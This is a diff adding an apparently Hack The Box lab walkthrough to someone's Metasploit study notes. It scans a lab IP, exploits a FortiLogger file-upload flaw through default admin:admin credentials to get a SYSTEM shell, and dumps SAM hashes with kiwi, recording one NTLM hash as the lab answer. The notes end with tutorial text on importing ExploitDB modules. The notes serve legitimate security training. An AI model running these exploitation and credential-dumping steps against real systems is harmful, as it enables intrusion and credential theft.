@@ -711,3 +711,36 @@ lsa_dump_sam
 lsa_dump_secrets
 ```
 ## Exercise
+
+>[!success] Target: 10.129.69.178
+### Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
+
+```shell
+sudo nmap -sV -p- -T5 -v 10.129.69.178 -sS -Pn # OR WE CAN USE db_nmap
+# We got a running service on port 5000 with a login admin:admin
+```
+
+![](src/08_src/04_login_admin_admin.png)
+
+```shell
+use exploit/windows/http/fortilogger_arbitrary_fileupload
+# SET OPTIONS
+getuid
+# NT AUTHORITY\SYSTEM
+```
+### Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
+
+```shell
+bg
+use post/multi/recon/local_exploit_suggester
+set SESSION 3 # In my case
+run
+
+load kiwi
+lsa_dump_sam # cf3a5525ee9414229e66279623ed5c58
+```
+# Writing and Importing Modules
+
+To install any new Metasploit modules which have already been ported over by other users, one can choose to update their `msfconsole` from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of `msfconsole`. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.
+
+[ExploitDB](https://www.exploit-db.com/) is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the `msfconsole`.
